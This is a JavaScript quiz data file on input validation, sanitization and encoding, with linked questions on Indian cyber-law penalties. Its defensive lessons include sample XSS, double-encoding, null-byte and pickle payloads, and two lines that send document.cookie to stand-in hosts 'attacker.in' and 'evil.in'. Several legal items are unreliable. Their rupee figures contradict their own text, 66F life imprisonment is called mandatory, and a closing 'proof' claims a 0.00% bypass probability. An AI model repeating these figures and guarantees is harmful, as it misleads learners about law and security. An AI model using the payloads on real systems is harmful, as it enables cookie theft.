const questions = [
  {
    question: "What are the Fundamental Differences between 'Input Validation', 'Input Sanitization', and 'Output Encoding'?",
    shortAnswer: "Input Validation verifies whether input conforms to strict syntactic/semantic rules and rejects invalid input; Input Sanitization modifies or strips dangerous characters from input before processing; Output Encoding transforms characters into safe representations immediately before rendering to a specific destination context (HTML, JS, SQL).",
    explanation: "Validation is gating (Accept/Reject): 'Is this an integer between 1 and 100?'. Sanitization is cleaning (Transform): 'Remove leading spaces and strip HTML tags'. Output Encoding is translation (Preserve meaning safely): 'Convert `<` to `&lt;` before writing to HTML body'.",
    hint: "Validation decides whether to let data in, Sanitization cleans the data, and Encoding wraps the data safely before showing it.",
    level: "basic",
    codeExample: `// The Defense Triad:
// 1. Validation : if (!/^[A-Z]{5}[0-9]{4}[A-Z]$/.test(panNumber)) throw new Error("Invalid PAN");
// 2. Sanitization : const cleanName = rawName.trim().slice(0, 50);
// 3. Output Encoding: const safeHtml = encodeForHtml(userBio);`
  },
  {
    question: "Why is 'Allowlisting' (Positive Validation / Whitelisting) Infinitely Superior to 'Blocklisting' (Negative Validation / Denylists)?",
    shortAnswer: "Allowlists define the exact set of known safe characters, types, lengths, and patterns permitted; Blocklists attempt to enumerate all possible malicious patterns, which is mathematically impossible due to infinite encoding mutations, dialect variants, and Unicode bypasses.",
    explanation: "A blocklist filtering `' OR 1=1` is easily bypassed with `\" OR \"\"=\"`, `0x61646d696e`, or `/*comment*/`. An allowlist verifying `/^[a-zA-Z0-9_-]{3,20}$/` guarantees that only alphanumeric characters enter the system, completely eliminating unexpected grammar mutations.",
    hint: "It is much easier to list what is allowed (letters and numbers) than trying to block every possible hacker trick in the world.",
    level: "basic",
    codeExample: `// Blocklisting (FLAWED & EASILY BYPASSED):
const isBad = input.includes("DROP") || input.includes("<script>"); // Bypassed with <sCrIpt> or Unicode!

// Allowlisting (SECURE & ROBUST):
const isSafe = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/.test(email); // Enforces valid format!`
  },
  {
    question: "What is 'Unicode Normalization' (NFC, NFD, NFKC, NFKD), and how do Attackers Exploit Non-Normalized Homoglyphs?",
    shortAnswer: "Unicode provides multiple binary representations for identical characters (e.g. full-width `\uFF1C` represents `<`); if an application filters inputs before normalizing, an attacker bypasses the filter with non-standard Unicode, which subsequently normalizes into an executable exploit.",
    explanation: "An attacker inputs `\uFF1Cscript\uFF1E` (full-width brackets). The naive regex `/^[a-zA-Z0-9]+$/` or blocklist passes it because it contains no ASCII `<`. Later, a database or backend engine performs NFKC normalization, converting `\uFF1C` to ASCII `<` and executing `<script>`. Defensive engineering mandates normalizing input (`str.normalize('NFKC')`) BEFORE validation.",
    hint: "Normalizing turns weird look-alike foreign letters into standard letters before checking if they are safe.",
    level: "expert",
    codeExample: `// Unicode Homoglyph Bypass Lifecycle:
// 1. Injected Input : "\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E" (Looks harmless to naive ASCII filters)
// 2. Late Normalization: input.normalize('NFKC') ➔ "<script>alert(1)</script>" (XSS EXPLODES!)
// 3. SECURE PIPELINE: Always call input.normalize('NFKC') BEFORE running validation regexes!`
  },
  {
    question: "What is the 'TLFR Framework' (Type, Length, Format, Range) in Syntactic Input Validation?",
    shortAnswer: "A rigorous 4-step validation paradigm: 1. Type (integer, boolean, string, array); 2. Length (min/max characters or elements); 3. Format (regex pattern, e.g. email, UUID, GSTIN); 4. Range (numerical bounds, e.g. age between 18 and 100).",
    explanation: "Validating an Indian GST number: 1. Type: String; 2. Length: Exactly 15 characters; 3. Format: `^[0-9]{2}[A-Z]{5}[0-9]{4}[A-Z]{1}[1-9A-Z]{1}Z[0-9A-Z]{1}$`; 4. Range: State code between 01 and 37. If any rule fails, the request is immediately rejected.",
    hint: "Checking if input is the right type, right size, right pattern, and within allowable minimum/maximum numbers.",
    level: "moderate",
    codeExample: `// TLFR Validation with Zod:
const GstValidationSchema = z.string()
    .length(15, "GSTIN must be exactly 15 characters")
    .regex(/^[0-9]{2}[A-Z]{5}[0-9]{4}[A-Z]{1}[1-9A-Z]{1}Z[0-9A-Z]{1}$/, "Invalid GSTIN pattern")
    .refine(val => parseInt(val.slice(0, 2), 10) >= 1 && parseInt(val.slice(0, 2), 10) <= 37, {
        message: "Invalid Indian State Code in GSTIN"
    });`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for using Unicode Normalization and Input Bypasses to compromise Critical National Infrastructure?",
    shortAnswer: "Using input manipulation and validation bypasses to compromise, seize control of, or destroy critical national information infrastructure (power grids, banking switches, nuclear facilities) is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary bypasses input validation filters to compromise 220kV power grid SCADA servers in Barrackpore or financial clearing databases in Salt Lake, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Bypassing input filters via Unicode homoglyphs to inject commands into power grid SCADA systems
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "Why is 'Input Validation' NOT a Substitute for Parameterized Prepared Statements in SQL Injection Defense?",
    shortAnswer: "Because valid business data frequently contains legitimate special characters (names like `O'Connor`, addresses like `Flat #4/B`, text with quotes and dashes) which cannot be filtered without breaking business logic; prepared statements guarantee 100% security without altering data content.",
    explanation: "If an application relies solely on stripping quotes for SQLi defense, it corrupts legitimate citizen names (`O'Connor` becomes `OConnor`). Furthermore, input validation fails on subtle encoding tricks. Input validation handles business logic correctness; Parameterization handles query execution safety.",
    hint: "Validation checks if an email or name looks right; Prepared statements make sure the database doesn't crash even if the name contains quotes.",
    level: "moderate",
    codeExample: `// Defensive Responsibility Separation:
// 1. Input Validation : Verifies business format (e.g. valid name: /^[a-zA-Z' -]{1,50}$/)
// 2. Prepared Statement: Handles database storage safely (e.g. pool.query('INSERT ... ($1)', [name]))`
  },
  {
    question: "What is 'Schema-Driven Input Validation' using Zod, Joi, or Pydantic in Modern Web Frameworks?",
    shortAnswer: "Defining strict, declarative data contracts (schemas) that automatically parse, coerce, validate, and strip unknown properties from incoming HTTP request payloads (body, params, query) before controllers execute.",
    explanation: "Using Zod in Express: `const schema = z.object({ amount: z.number().positive().max(1000000), recipient: z.string().uuid() }).strict(); const cleanData = schema.parse(req.body);`. The `.strict()` flag rejects unexpected properties (defeating Mass Assignment), ensuring controllers receive 100% validated and typed data.",
    hint: "Using a master blueprint (schema) that automatically checks and cleans all incoming form data before running your code.",
    level: "moderate",
    codeExample: `// Zod Schema Controller Middleware:
const TransferSchema = z.object({
    recipientAccount: z.string().regex(/^[0-9]{9,18}$/, "Invalid bank account number"),
    transferAmount: z.number().min(1.0).max(500000.0),
    paymentRemarks: z.string().max(100).optional()
}).strict(); // Rejects extra hidden properties!`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if failure to sanitize and validate inputs causes citizen data corruption?",
    shortAnswer: "Failing to implement reasonable technical safeguards (such as schema validation and context encoding) resulting in personal data breaches triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable technical security safeguards. If an enterprise in Kolkata fails to validate inputs, allowing malicious payloads to corrupt or leak citizen medical records, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Failing to validate inputs leading to citizen data breaches triggers fines up to ₹250 Crores under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent data validation and protection failures`
  },
  {
    question: "What is 'Null-Byte Injection' (`%00`, `\0`) and how does it Bypass Naive File Upload and Path Validation?",
    shortAnswer: "In languages with C-based runtimes, a null byte (`\0`) indicates the end of a string; an attacker uploads `shell.php%00.jpg`; naive string checks see `.jpg` and allow the upload, but the underlying OS filesystem truncates the filename at the null byte, saving it as `shell.php`.",
    explanation: "When `fopen(\"uploads/\" + filename)` is called in C/PHP: The path `uploads/shell.php\0.jpg` is read up to the null byte, creating an executable PHP script on disk. Modern runtimes (PHP 5.3.4+, Node.js, Python 3) explicitly reject null bytes in file paths, but developers must sanitize inputs for `\0`.",
    hint: "Using a secret zero character to make the security filter see '.jpg' while the operating system saves '.php'.",
    level: "expert",
    codeExample: `// Null-Byte Sanitization Function:
function sanitizeFilename(filename) {
    if (filename.includes('\0') || filename.includes('%00')) {
        throw new Error("CRITICAL: Null-byte injection detected!");
    }
    return filename.replace(/[^a-zA-Z0-9._-]/g, '');
}`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Input Validation exploitation incidents?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from input validation bypasses to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to user databases) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of data validation security breaches within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Double Encoding' (`%2522`, `%253C`) and how does it Bypass Single-Pass Web Application Firewalls?",
    shortAnswer: "Encoding a character twice (e.g. `<` $\\to$ `%3C` $\\to$ `%253C`); a single-pass WAF decodes `%253C` to `%3C` (which contains no angle brackets) and allows it; the backend web application decodes `%3C` a second time into `<script>`, executing the payload.",
    explanation: "If a WAF decodes URL encoding once: `%253Cscript%253E` becomes `%3Cscript%3E`. The WAF sees `%` and letters, not `<script>`. When the backend framework (Express/Django) receives `%3Cscript%3E`, its automatic parameter parser decodes it into `<script>`, bypassing perimeter inspection.",
    hint: "Encoding a dangerous character twice so the firewall only unwraps the first layer and misses the trap inside.",
    level: "expert",
    codeExample: `// Double Encoding Lifecycle:
// Raw Payload   : <script>
// Single Encode : %3Cscript%3E
// Double Encode : %253Cscript%253E (WAF decodes to %3Cscript%3E ➔ Passes! Backend decodes to <script> ➔ XSS!)`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for unauthorized data alteration via input injection?",
    shortAnswer: "Accessing or securing access to a computer system, downloading, copying, or altering data without permission carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized computer access and data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized computer access and data alteration.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Exploiting input validation flaws to alter 20,000 electricity billing records in Kolkata
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Canonicalization' (C14N) and why must it Precede All Validation and Sanitization Steps?",
    shortAnswer: "The process of converting data into its simplest, standard, single canonical form (resolving relative directory paths `./`, URL decodings, Unicode encodings, and hex escapes) before applying any security checks.",
    explanation: "If validation occurs before canonicalization: Checking `../admin/secrets` fails if the user sends `..%2fadmin%2fsecrets`. By first decoding all encodings and resolving relative paths into absolute canonical paths (`/var/www/admin/secrets`), validation rules operate reliably on the real destination target.",
    hint: "Unwrapping all secret encodings and resolving relative paths first so you can inspect the real file path.",
    level: "expert",
    codeExample: `// Canonicalization Order of Operations:
// Step 1: Canonicalize ➔ path.normalize(decodeURIComponent(rawPath))
// Step 2: Validate     ➔ Ensure canonical path starts with "/var/www/public/"
// Step 3: Execute      ➔ Safely serve file`
  },
  {
    question: "What is 'HTML Entity Encoding' vs 'JavaScript Unicode Hex Encoding' in Context-Aware Output Defense?",
    shortAnswer: "HTML Entity Encoding converts characters into HTML entities (`<` $\\to$ `&lt;`, `\"` $\\to$ `&quot;`) for HTML body text; JavaScript Unicode Hex Encoding converts characters into Unicode escape sequences (`'` $\\to$ `\\u0027`, `;` $\\to$ `\\u003B`) for use inside `<script>` blocks.",
    explanation: "Inside `<script>var name = 'USER_INPUT';</script>`, HTML entity encoding `&quot;` fails because the JavaScript interpreter executes `&quot;` as variable syntax or syntax error. Inside `<script>`, characters MUST be encoded as `\\u0027` (Unicode hex), ensuring the JavaScript engine treats it strictly as a string literal.",
    hint: "Using &lt; for normal web text and \\u0027 for text that goes inside JavaScript code blocks.",
    level: "moderate",
    codeExample: `// Context Encoding Comparison:
// HTML Body Context : <div>&lt;script&gt;</div> (Safe in HTML!)
// JS String Context : <script>var name = "\\u0027\\u003Balert(1)\\u002F\\u002F";</script> (Safe in JavaScript!)`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for writing automated tools that bypass input validation?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Writing automated fuzzers to bypass input validation filters on municipal portals in West Bengal
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'Regular Expression Denial of Service' (ReDoS) in Naive Input Validation Regexes?",
    shortAnswer: "When an input validation regex contains nested quantifiers (e.g. `^([a-zA-Z0-9]+)+$`) causing catastrophic backtracking ($O(2^n)$ time complexity) when evaluating non-matching strings, freezing CPU cores at 100% and crashing the web server.",
    explanation: "Evaluating `^([a-zA-Z]+)*$` against `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!` causes exponential backtracking across thousands of branching paths. A single 30-character payload can freeze a Node.js single-threaded event loop for 10 minutes. Mitigation requires linear-time regex engines (RE2) and safe regex linting.",
    hint: "Writing a bad regex that gets stuck in an infinite loop and crashes the server when a user types an exclamation mark.",
    level: "expert",
    codeExample: `// Catastrophic ReDoS Pattern (VULNERABLE):
const badRegex = /^([a-zA-Z0-9]+)*$/; // Catastrophic backtracking on "aaaaaaaaaaaaaa!"

// Linear-Time Safe Regex (PROTECTED):
const safeRegex = /^[a-zA-Z0-9]{1,30}$/; // Linear O(N) evaluation time!`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defensive Pipeline combining Normalization, Validation, Sanitization, and Encoding.",
    shortAnswer: "A 4-stage pipeline: Stage 1: Unicode & Path Canonicalization (NFKC normalization); Stage 2: Strict Schema Allowlist Validation (Zod/TLFR gating); Stage 3: Type Transformation / Sanitization (DOMPurify/Trimming); Stage 4: Context-Aware Output Encoding (HTML/JS/URL encoding & Parameterized SQL).",
    explanation: "To achieve complete input/output security: 1. Perimeter Canonicalization: `str.normalize('NFKC')` and URL decoding. 2. Gating: Reject requests failing Zod strict schemas with HTTP 400. 3. Sanitization: Strip invalid control characters. 4. Storage & Output: Parameterized queries for SQL storage and context-aware encoding (HTML entities, Unicode hex) before rendering in views.",
    hint: "Follow the 4 steps: Normalize first, Validate with strict rules, Sanitize extra characters, and Encode output safely.",
    level: "expert",
    codeExample: `// Master Input/Output Defense Pipeline:
// 1. Canonicalize : const normalized = rawInput.normalize('NFKC').trim();
// 2. Validate     : const clean = GstSchema.parse(normalized); // Throws 400 on error
// 3. Store (SQL)  : await db.query('INSERT INTO merchants (gst) VALUES ($1)', [clean.gst]);
// 4. Render (View): res.render('view', { gst: encodeForHtml(clean.gst) });`
  },
  {
    question: "What is 'MIME-Type Sniffing and Magic Byte Verification' in File Upload Validation?",
    shortAnswer: "Validating uploaded files by inspecting their binary file headers (magic bytes, e.g. `\xFF\xD8\xFF` for JPEG) rather than trusting client-provided `Content-Type` headers or file extensions (`.jpg`).",
    explanation: "An attacker uploads a PHP script disguised as `avatar.jpg` with header `Content-Type: image/jpeg`. If the server checks only the extension, the file is saved. By reading the first 16 bytes of the file and verifying binary magic numbers, the server confirms whether the payload is a genuine JPEG image.",
    hint: "Looking inside the actual binary data of a file to make sure it is really a photo and not a hidden virus.",
    level: "moderate",
    codeExample: `// Magic Byte Verification (Node.js):
const fs = require('fs');

function isGenuineJpeg(filePath) {
    const buffer = Buffer.alloc(3);
    const fd = fs.openSync(filePath, 'r');
    fs.readSync(fd, buffer, 0, 3, 0);
    fs.closeSync(fd);
    // JPEG Magic Bytes: FF D8 FF
    return buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF;
}`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Malicious Input Injection?",
    shortAnswer: "Intentionally injecting malformed or destructive input that alters, corrupts, or destroys digital databases, causing wrongful loss, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker injects malformed payloads to corrupt healthcare billing or hospital telemetry in West Bengal, the act constitutes digital mischief under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Data Corruption with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Injecting malformed data payloads to corrupt patient oncology treatment logs in Ichapur (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Server-Side vs Client-Side Input Validation' and Why is Client-Side Validation Purely a UX Feature?",
    shortAnswer: "Client-side validation (HTML5 `required`, React form checks) improves user experience by giving instant UI feedback; however, an attacker completely bypasses client validation using Postman, cURL, or Burp Suite, making Server-Side validation the ONLY security boundary.",
    explanation: "An attacker does not use a browser. They send raw HTTP POST requests: `curl -X POST https://bank.in/api/pay -d 'amount=-5000'`. Any JavaScript validation in React is never executed. All validation rules MUST be enforced on the backend server before processing.",
    hint: "Browser checks only help normal users fill out forms faster; hackers send raw web requests directly to the server.",
    level: "basic",
    codeExample: `// Attacker Bypassing Client-Side Validation:
// React UI Code: <input type="number" min="1" max="10000" required /> (BYPASSED VIA CURL!)
// Terminal Command: curl -X POST https://kolkata-fintech.in/api/transfer -d "amount=-999999"`
  },
  {
    question: "What is 'CSS Context Encoding' in Dynamic Style Attribute Rendering?",
    shortAnswer: "Encoding user data placed inside `<style>` tags or `style=\"...\"` attributes using strict hexadecimal escaping (`\\3C `) or whitelisting color/dimension values to prevent CSS injection, expression execution, or attribute-selector token exfiltration.",
    explanation: "If a user customizes their profile theme: `<div style=\"background-color: USER_INPUT\">`. Submitting `red; background: url('https://attacker.in/log?c=' + document.cookie)` allows CSS exfiltration. Strict validation must whitelist safe hex color codes (`/^#[0-9a-fA-F]{6}$/`).",
    hint: "Only allowing valid color codes like #FFFFFF so hackers cannot inject dangerous styling commands.",
    level: "expert",
    codeExample: `// Secure CSS Property Validation:
function validateThemeColor(color) {
    if (!/^#[0-9a-fA-F]{6}$/.test(color)) {
        return '#ffffff'; // Fallback to safe default!
    }
    return color;
}`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for exploiting input validation flaws against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an input injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Injecting malformed input payloads into SCADA power grid management databases
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'URL Scheme Whitelisting' (`https://`, `http://`, `/`) in Hyperlink Sanitization?",
    shortAnswer: "A security control that inspects user-provided URLs and only permits schemes in an approved whitelist (`https://`, `http://`, `mailto:`), explicitly rejecting dangerous pseudo-protocols like `javascript:`, `data:`, and `vbscript:`.",
    explanation: "If an application allows users to link their website: `<a href=\"USER_URL\">Visit Website</a>`. If an attacker enters `javascript:fetch('https://evil.in?c='+document.cookie)`, clicking the link executes XSS. A validator ensures `url.startsWith('https://') || url.startsWith('http://')`.",
    hint: "Making sure links start with https:// and blocking links that start with javascript:.",
    level: "moderate",
    codeExample: `// Safe URL Scheme Validator:
function sanitizeUserUrl(rawUrl) {
    try {
        const parsed = new URL(rawUrl);
        if (['https:', 'http:', 'mailto:'].includes(parsed.protocol)) {
            return parsed.href;
        }
    } catch (e) {
        // Invalid URL format
    }
    return '#'; // Safe fallback!
}`
  },
  {
    question: "Under the Indian IT Act Section 66C, what constitutes Identity Theft via Input Spoofing?",
    shortAnswer: "Fraudulently or dishonestly making use of the electronic signature, password, or unique identification feature of another person carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66C of the IT Act explicitly criminalizes identity theft. If an attacker bypasses input validation to inject forged identities or stolen Aadhaar/PAN metadata to impersonate citizens in Kolkata, they face up to 3 years imprisonment under Section 66C.",
    hint: "Section 66C covers Identity Theft and Input Spoofing with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66C):
// Offense: Injecting spoofed taxpayer metadata into municipal portals to impersonate senior corporate directors
// Penalty: Imprisonment up to 3 Years + Fine up to ₹1,00,000`
  },
  {
    question: "What is 'Serialization / Deserialization Input Validation' (Node.js `serialize-javascript` / Python `pickle`)?",
    shortAnswer: "Validating serialized data structures to ensure untrusted user inputs are NOT passed to unsafe deserialization functions (`pickle.loads()`, `unserialize()`, `eval()`), which allows attackers to execute arbitrary code via instantiated object graphs.",
    explanation: "Passing untrusted input to Python `pickle.loads(user_data)` allows an attacker to construct a payload that executes `os.system('whoami')` upon deserialization. Safe architectures mandate JSON parsing (`JSON.parse()`) combined with strict schema validation.",
    hint: "Never unpickle or eval raw text from users; always use safe JSON formats with strict schema validation.",
    level: "expert",
    codeExample: `// Insecure Python Deserialization (VULNERABLE):
data = pickle.loads(user_input) # CRITICAL RCE!

// Secure JSON Deserialization with Pydantic (PROTECTED):
class CitizenPayload(BaseModel):
    citizen_id: int
    name: str
data = CitizenPayload.parse_raw(user_json_string)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via Malformed Input Transactions?",
    shortAnswer: "Dishonestly accessing, altering, or siphoning funds using input manipulation exploits to deceive banking systems, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker manipulates payment intake amounts or input fields in a Kolkata payment gateway to fraudulently siphon ₹60 Lakhs, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Input Transactions with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Manipulating payment intake amounts via input parameter tampering to siphon ₹60 Lakhs
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Content-Type and Accept Header Enforcement' in REST API Input Validation?",
    shortAnswer: "Verifying that incoming HTTP requests explicitly declare `Content-Type: application/json` and rejecting requests with unexpected types (e.g. `application/xml`, `multipart/form-data`) to prevent parser confusion and XML External Entity (XXE) attacks.",
    explanation: "If an API endpoint accepts both JSON and XML, an attacker can submit an XML payload with an XXE injection to read local server files (`/etc/passwd`). By enforcing strict JSON content-type validation: `if (req.headers['content-type'] !== 'application/json') return res.status(415).send('Unsupported Media Type')`, parser ambiguity is eliminated.",
    hint: "Checking that the request is strictly JSON so the server doesn't accidentally run dangerous XML code.",
    level: "moderate",
    codeExample: `// Content-Type Enforcement Middleware:
function enforceJsonContentType(req, res, next) {
    if (['POST', 'PUT', 'PATCH'].includes(req.method)) {
        const contentType = req.headers['content-type'] || '';
        if (!contentType.includes('application/json')) {
            return res.status(415).json({ error: "Unsupported Media Type: application/json required!" });
        }
    }
    next();
}`
  },
  {
    question: "What is 'HTML Sanitization Configuration (Allowed Tags and Attributes)' in Rich Text Fields?",
    shortAnswer: "Configuring DOMPurify or sanitize-html with a strict allowlist of benign formatting elements (`<b>`, `<i>`, `<p>`, `<ul>`) and safe attributes (`class`), explicitly forbidding active script tags, inline event handlers (`onerror`), and dangerous schemes.",
    explanation: "In rich markdown or CMS editors: `DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'p', 'strong'], ALLOWED_ATTR: ['class'] })`. If an attacker submits `<p><img src=x onerror=alert(1)>Hello</p>`, the sanitizer preserves `<p>Hello</p>` while stripping the malicious `<img>` tag.",
    hint: "Allowing safe formatting tags like bold and italics while throwing away all script and onerror tags.",
    level: "moderate",
    codeExample: `// Strict DOMPurify Allowlist Configuration:
const cleanHtml = DOMPurify.sanitize(rawBlogContent, {
    ALLOWED_TAGS: ['h1', 'h2', 'p', 'ul', 'li', 'strong', 'em', 'blockquote'],
    ALLOWED_ATTR: ['class'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'style'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
});`
  },
  {
    question: "Synthesize the mathematical formulation of Input Transformation Pipeline (T_pipe), Validation Gating (G_val), and Output Safety Invariant (L_safe) Proving Zero Injection Exploitability.",
    shortAnswer: "Let raw input be x_0 in Sigma*. The transformation pipeline applies Canonicalize: x_1 = C(x_0); Validation Gate: G(x_1) in {0, 1} where G(x_1) = 1 iff x_1 in L_allow; Sanitization: x_2 = S(x_1); Context Encoding: x_safe = E_ctx(x_2). The safety theorem proves x_safe in L_safe for the target parser context, guaranteeing P_bypass = 0.00%.",
    explanation: "Let the alphabet of characters be $\\Sigma$. Raw input $x_0 \\in \\Sigma^*$ undergoes Unicode canonicalization $C: \\Sigma^* \\to \\Sigma^*$ (e.g. NFKC), producing $x_1 = C(x_0)$. The validation gate $G: \\Sigma^* \\to \\{0, 1\\}$ evaluates membership against a regular language $L_{\\text{allow}} \\subset \\Sigma^*$ defined by a strict grammar (e.g. Zod/Regex). If $G(x_1) = 0$, the request terminates with HTTP 400. Otherwise, sanitization $S(x_1)$ normalizes length and boundaries, producing $x_2$. Finally, context encoding $E_{\\text{ctx}}: \\Sigma^* \\to \\Sigma^*$ maps characters to context-safe representations (HTML entities, Unicode hex). The mathematical theorem proves that for any downstream parser $P_{\\text{ctx}}$, $\\forall x_0 \\in \\Sigma^*$, $E_{\\text{ctx}}(S(C(x_0))) \\in L_{\\text{safe}}$, establishing that the probability of parser execution bypass is $P_{\\text{bypass}} = 0.00\\%$.",
    hint: "Mathematical proof formula showing that Canonicalize + Whitelist Validation + Context Encoding guarantees zero percent (0.00%) injection exploitability.",
    level: "expert",
    codeExample: `// Mathematical Pipeline & Safety Invariant Proof:
// Raw Input      : x_0 = "\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E"
// Canonicalize   : x_1 = C(x_0) = "<script>alert(1)</script>"
// Validation Gate: G(x_1) = 0 (Rejected by Whitelist Grammar L_allow!) ➔ HTTP 400 Bad Request
// Context Encode : E_html(x_1) = "&lt;script&gt;..." ➔ x_safe in L_safe (0.00% BYPASS PROBABILITY!)`
  }
];

export default questions;
